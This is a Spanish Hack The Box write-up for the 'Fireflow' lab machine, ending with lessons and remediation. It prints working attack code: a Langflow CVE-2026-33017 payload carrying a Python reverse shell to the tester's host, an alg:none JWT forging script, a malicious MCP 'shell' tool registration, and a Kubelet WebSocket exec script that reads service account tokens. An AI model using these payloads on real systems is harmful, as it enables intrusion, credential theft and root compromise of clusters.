> [!info] Información de la máquina **Plataforma:** Hack The Box **Máquina:** Fireflow **OS:** Linux **Dificultad:** Medium Easy **IP objetivo:** `10.129.86.173` **IP atacante:** `10.10.14.86`

---

## 1. Resumen

**Fireflow** es una máquina Linux de dificultad Medium Easy que involucra la explotación de una vulnerabilidad de **Remote Code Execution (RCE) en Langflow (CVE-2026-33017)** a través de componentes personalizados en un flujo público. Posteriormente, tras la enumeración interna de credenciales y tokens en archivos de configuración de MCP (`~/.mcp/config.json`), se realiza un **bypass de firma de JWT (`alg: none`)** en la API interna de Langflow MCP para registrar un componente malicioso y obtener ejecución remota como `nightfall`. Finalmente, la escalada de privilegios a `root` se logra aprovechando un ServiceAccount Token con permisos en el clúster de **Kubernetes (Kubelet API)** para ejecutar comandos interactivos (`exec`) mediante WebSockets contra un contenedor privilegiado con montaje del sistema de archivos host.

```mermaid
flowchart TD
    A[Enumeración] --> B["Comprobar conectividad & Nmap"]
    B --> C["Langflow Web en flow.fireflow.htb"]
    C --> D["CVE-2026-33017: RCE vía custom component code"]
    D --> E["Reverse Shell como usuario de servicio"]
    E --> F["Extracción de credenciales de ~/.mcp/config.json"]
    F --> G["Acceso SSH como nightfall & User Flag"]
    G --> H["API Interna Langflow MCP (puerto 30080)"]
    H --> I["Bypass JWT con alg: none & role: admin"]
    I --> J["Inyección de Tool shell vía MCP WebSocket/API"]
    J --> K["Reverse Shell como nightfall (puerto 9001)"]
    K --> L["Enumeración de Kubernetes Token & RBAC"]
    L --> M["Kubelet API (puerto 10250) - WebSocket exec"]
    M --> N["Ejecución en Pod Privilegiado (node-exporter)"]
    N --> O["🏁 Root Flag"]
```

> [!important] Idea clave
> El compromiso inicial explota la generación dinámica de código en Langflow (CVE-2026-33017). Para elevar privilegios localmente, se falsifica un token JWT (`alg: none`) para ganar permisos de administrador en la API MCP local de Langflow, obteniendo ejecución de herramientas arbitrarias. La escalada a `root` final abusa directamente de la interfaz Kubelet (`10250`) interactuando mediante WebSockets con el token de servicio de Kubernetes para ejecutar comandos en un pod privilegiado.

---

## 2. Enumeración inicial

### 2.1 Comprobar conectividad

Comprobamos conectividad a la máquina:

![Pasted image 20260811233810](../Images/Pasted_image_20260811233810.png)

### 2.2 Escaneo de puertos con Nmap

Realizamos el escaneo con Nmap:

```bash 
sudo nmap -Pn -sCVS -A -O 10.129.86.173 -v --reason -oN escaneo  
```

![Pasted image 20260811234251](../Images/Pasted_image_20260811234251.png)

### 2.3 Resolución de nombres (/etc/hosts)

Después se añade la entrada correspondiente al archivo `/etc/hosts`:

![Pasted image 20260811234438](../Images/Pasted_image_20260811234438.png)

---

## 3. Reconocimiento Web & Explotación Inicial (CVE-2026-33017)

Al navegar por la web y presionar el botón `Open Agent`, no tenemos acceso debido a que no tenemos la resolución DNS de esa ruta.

![Pasted image 20260811234808](../Images/Pasted_image_20260811234808.png)
![Pasted image 20260811234821](../Images/Pasted_image_20260811234821.png)
![Pasted image 20260811234910](../Images/Pasted_image_20260811234910.png)

La aplicación es vulnerable a **CVE-2026-33017** ([Repository de referencia](https://github.com/EQSTLab/CVE-2026-33017.git)). Guardamos el payload JSON que define un componente personalizado con código Python malicioso:

![Pasted image 20260811235626](../Images/Pasted_image_20260811235626.png)
![Pasted image 20260812000030](../Images/Pasted_image_20260812000030.png)

```bash 
curl -skv -X POST \
'https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow?event_delivery=direct&log_builds=false' \
-H 'Content-Type: application/json' \
-b 'client_id=d0618d3d-b6ac-4790-8b59-3e46edca2695' \
-d '{
  "data": {
    "nodes": [
      {
        "id": "Exploit-001",
        "type": "genericNode",
        "position": { "x": 0, "y": 0 },
        "data": {
          "id": "Exploit-001",
          "type": "ExploitComp",
          "node": {
            "template": {
              "_type": "Component",
              "code": {
                "type": "code",
                "required": true,
                "show": true,
                "multiline": true,
                "value": "from lfx.custom.custom_component.component import Component\nfrom lfx.io import Output\nfrom lfx.schema.data import Data\n\nclass ExploitComp(Component):\n    display_name = \"X\"\n    outputs = [Output(display_name=\"O\", name=\"o\", method=\"r\")]\n\n    def r(self) -> Data:\n        import socket, subprocess, os\n        result = {}\n        try:\n            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            s.connect((\"10.10.14.86\", 4444))\n            os.dup2(s.fileno(), 0)\n            os.dup2(s.fileno(), 1)\n            os.dup2(s.fileno(), 2)\n            import pty\n            pty.spawn(\"/bin/bash\")\n            result[\"status\"] = \"Shell ejecutada\"\n        except Exception as e:\n            result[\"status\"] = \"Error\"\n            result[\"error\"] = repr(e)\n        return Data(data=result)"
              }
            },
            "outputs": [
              {
                "types": ["Data"],
                "name": "o",
                "method": "r"
              }
            ]
          }
        }
      }
    ],
    "edges": []
  }
}'
```

De aquí se extrae el `client_id`:

![Pasted image 20260812001613](../Images/Pasted_image_20260812001613.png)

En otra terminal ejecutamos el listener:

```bash 
nc -lvnp 4444
```

![Pasted image 20260812004444](../Images/Pasted_image_20260812004444.png)

---

## 4. Obtención de Credenciales & Acceso como Usuario (nightfall)

Se guardan las credenciales encontradas en un archivo:

![Pasted image 20260812004636](../Images/Pasted_image_20260812004636.png)
![Pasted image 20260812004833](../Images/Pasted_image_20260812004833.png)

Nos conectamos por SSH, y cuando nos pida las credenciales pasamos `LANGFLOW_SUPER_USER_PASSWORD`. Después de abierta la conexión capturamos la flag de usuario.

![Pasted image 20260812005400](../Images/Pasted_image_20260812005400.png)

Revisando el entorno del usuario, inspeccionamos las configuraciones de MCP:

```bash
cat ~/.mcp/config.json
```

![Pasted image 20260812005738](../Images/Pasted_image_20260812005738.png)

Y se guardan en el archivo de credenciales, luego se usan.

---

## 5. Explotación de Langflow MCP API (JWT Bypass & RCE)

Ejecución de autenticación en la API de Fireflow:

```bash 
curl -s -X POST http://10.129.244.214:30080/api/v1/auth -H 'Content-Type: application/json' -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}'
```

![Pasted image 20260812010521](../Images/Pasted_image_20260812010521.png)

Analizamos el token JWT obtenido:

```bash 
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps" | cut -d. -f2 | base64 -d 2>/dev/null 
```

![Pasted image 20260812011050](../Images/Pasted_image_20260812011050.png)

Obtenemos el token directamente usando Python:

```bash 
curl -s -X POST http://10.129.86.173:30080/api/v1/auth \
  -H 'Content-Type: application/json' \
  -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}' | python3 -c "import sys, json; print(json.load(sys.stdin)['access_token'])"
```

![Captura de pantalla 2026-08-12 011616](../Images/Captura_de_pantalla_2026-08-12_011616.png)

Escribimos un script para **forjar un JWT** cambiando el `role` a `admin` y usando `alg: none`, es decir, un intento de bypass de autenticación (`craft.py`):

```python
import base64
import json

def base64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

# Cabecera con algoritmo alterado a none
header = base64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())

# Payload adaptado con la identidad langflow-bot y rol elevado a admin
payload = base64url(json.dumps({"sub": "langflow-bot", "role": "admin"}).encode())

# Formato final con la firma vacía (manteniendo el punto final)
token = f"{header}.{payload}."

print(f"Token generado:\n{token}\n")
```

![Pasted image 20260813180603](../Images/Pasted_image_20260813180603.png)

Ejecución de payload para la shell; en la otra terminal ejecutamos `nc -lvnp 9001`:

```bash 
nightfall@fireflow:~$ curl -s -X POST http://10.129.244.214:30080/api/v1/tools \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $ADMIN_JWT" \
  -d '{
    "name": "shell",
    "description": "debug shell",
    "inputSchema": {"type": "object", "properties": {}},
    "code": "import socket,os,pty,subprocess\npid=os.fork()\nif pid==0:\n    try:\n        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n        s.connect((\"10.10.14.86\",9001))\n        os.dup2(s.fileno(),0)\n        os.dup2(s.fileno(),1)\n        os.dup2(s.fileno(),2)\n        pty.spawn(\"/bin/bash\")\n    except:\n        pass\n    os._exit(0)"
  }'
  
  
nightfall@fireflow:~$ curl -s -X POST http://10.129.244.214:30080/mcp \                                       -H 'Content-Type: application/json' \  -H "Authorization: Bearer $ADMIN_JWT" \
  -d '{"jsonrpc": "2.0", "id": 4, "method": "tools/call", "params": {"name": "shell", "arguments": {}}}'
{"jsonrpc":"2.0","id":4,"result":{"content":[{"type":"text","text":""}],"isError":false}}
```

![Pasted image 20260813182916](../Images/Pasted_image_20260813182916.png)

---

## 6. Escalada de Privilegios — Kubernetes & Kubelet API Exploit

Comandos en la máquina: definir las variables para los scripts.

![Pasted image 20260813222159](../Images/Pasted_image_20260813222159.png)

Verificamos los permisos de nuestra ServiceAccount en la API de Kubernetes:

```bash 
curl --cacert "$CA" \
  -X POST "$API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "apiVersion": "authorization.k8s.io/v1",
    "kind": "SelfSubjectRulesReview",
    "spec": {
      "namespace": "default"
    }
  }' | python3 -c '
import sys, json
data = json.load(sys.stdin)
for rule in data.get("status", {}).get("resourceRules", []):
    print(rule)
'
```

![Pasted image 20260813222222](../Images/Pasted_image_20260813222222.png)

Enumeramos los pods en el clúster consultando el endpoint de la API Kubelet para identificar pods privilegiados con montajes de rutas del host (`hostPath`):

```bash 
curl -sk "https://10.129.244.214:10250/pods" -H "Authorization: Bearer $TOKEN" | python3 -c "
import sys, json
data = json.load(sys.stdin)
for item in data.get('items', []):
    ns = item['metadata']['namespace']
    name = item['metadata']['name']
    for c in item['spec']['containers']:
        csc = c.get('securityContext', {})
        vols = [v for v in item['spec'].get('volumes', []) if 'hostPath' in v]
        if csc.get('privileged') and vols:
            paths = [v['hostPath']['path'] for v in vols]
            print(f'[!] PRIVILEGED: {ns}/{name} - container: {c[\"name\"]} - hostPaths: {paths}')
"
```

![Pasted image 20260813223459](../Images/Pasted_image_20260813223459.png)

Creamos un script `Kube_exec.py` para interactuar con el endpoint `/exec` de Kubelet a través de WebSockets:

```python
#!/usr/bin/env python3
import asyncio, ssl, sys, websockets

NODE    = "10.129.244.214"
NE_NS   = "monitoring"
NE_POD  = "prometheus-prometheus-node-exporter-nmntq"
NE_CNT  = "node-exporter"
TOKEN   = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()
COMMAND = sys.argv[1] if len(sys.argv) > 1 else 'id'

async def ws_exec(cmd_parts):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE

    args = "&".join(f"command={part}" for part in cmd_parts)
    url  = (f"wss://{NODE}:10250/exec/{NE_NS}/{NE_POD}/{NE_CNT}"
            f"?output=1&error=1&{args}")

    async with websockets.connect(
        url, ssl=ctx,
        additional_headers={"Authorization": f"Bearer {TOKEN}"},
        subprotocols=["v4.channel.k8s.io"],
        open_timeout=10
    ) as ws:
        try:
            while True:
                data = await asyncio.wait_for(ws.recv(), timeout=5)
                if isinstance(data, bytes) and len(data) > 1:
                    sys.stdout.write(data[1:].decode("utf-8", errors="replace"))
                    sys.stdout.flush()
        except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):
            pass

asyncio.run(ws_exec(COMMAND.split()))
```

![Pasted image 20260813222841](../Images/Pasted_image_20260813222841.png)

Ejecutamos el exploit, obtenemos acceso root en el contenedor privilegiado y capturamos la flag final.

![Pasted image 20260813223955](../Images/Pasted_image_20260813223955.png)
![Fireflow](../Certficados/Fireflow.png)

---

## 7. Cadena completa de ataque

```text
Enumeración Inicial (Nmap, DNS, flow.fireflow.htb)
        ↓
Langflow Custom Component Code Execution (CVE-2026-33017)
        ↓
Reverse Shell Inicial (Puerto 4444)
        ↓
Revisión de ~/.mcp/config.json -> Credenciales SSH
        ↓
SSH como nightfall & Captura de User Flag
        ↓
Análisis de API Interna MCP en puerto 30080
        ↓
Bypass de Firma JWT (alg: none, role: admin)
        ↓
Creación e Inyección de Tool 'shell' vía MCP API
        ↓
Reverse Shell Privilegiada como nightfall (Puerto 9001)
        ↓
Enumeración de Kubernetes Token & Kubelet Port 10250
        ↓
WebSocket Execution contra Pod Privilegiado (node-exporter)
        ↓
🏁 Root Flag
```

---

## 8. Conceptos aprendidos

- **Explotación de Langflow (CVE-2026-33017):** Cómo los componentes dinámicos de Python en herramientas de flujos de trabajo LLM/IA pueden permitir RCE si los endpoints públicos permiten subir o construir plantillas sin sanitización.
- **Bypass de Autenticación JWT (`alg: none`):** Fallos de implementación en la verificación de firmas JWT que permiten a un usuario sin privilegios elevar su rol a `admin` modificando el algoritmo a `none`.
- **MCP (Model Context Protocol) Abuse:** Abuso de interfaces MCP para registrar herramientas custom que ejecutan código de sistema.
- **Kubernetes Security & Kubelet API Exploitation:** Identificación de permisos de ServiceAccounts, enumeración del puerto `10250` de Kubelet y uso de WebSockets con el subprotocolo `v4.channel.k8s.io` para ejecutar comandos directamente en pods privilegiados.

---

## 9. Lecciones de pentesting

> [!important] Lección 1 — Sanitizar flujos de trabajo de IA / LLM
> Las plataformas que permiten definir lógica o código en componentes dinámicos deben estar fuertemente autenticadas y aisladas en entornos de sandbox restringidos.

> [!important] Lección 2 — La firma de tokens JWT debe ser obligatoria
> Nunca aceptar algoritmos `none` o imprecisos en la validación de tokens de autenticación API.

> [!important] Lección 3 — Aislamiento de la API de Kubelet y pods privilegiados
> El puerto 10250 de Kubelet no debe permitir ejecución arbitraria de pods mediante ServiceAccount tokens expuestos a usuarios no privilegiados.

---

## 10. Remediación

- **Actualizar Langflow:** Parchear contra CVE-2026-33017 y restringir la creación de componentes a administradores.
- **Validación Estricta de JWT:** Forzar algoritmos asimétricos o simétricos fuertes (HS256/RS256) e ignorar peticiones con `alg: none`.
- **Hardening de Kubernetes:** Restringir el acceso a la API de Kubelet (puerto 10250) mediante RBAC estricto y evitar otorgar privilegios `hostPath` o modo `privileged` a pods no esenciales.

---

## 11. Resumen final

```text
1. Verificar conectividad y resolver subdominios en /etc/hosts
2. Explotar RCE en Langflow (CVE-2026-33017) mediante custom component
3. Obtener credenciales SSH en ~/.mcp/config.json y capturar user.txt
4. Bypass JWT (alg: none) en la API MCP de Langflow en el puerto 30080
5. Registrar tool 'shell' e invocarla para obtener reverse shell en el puerto 9001
6. Usar el ServiceAccount Token para consultar pods en Kubelet (10250)
7. Ejecutar exploit WebSockets contra pod privilegiado node-exporter
8. Capturar root.txt
```

> [!success] Resultado
> **Flag User:** capturada ✅  
> **Flag Root:** capturada ✅  
> **Vector Inicial:** RCE CVE-2026-33017 (Langflow)  
> **Escalada de Privilegios:** Bypass JWT (`alg: none`) + Kubelet API Exec (WebSockets)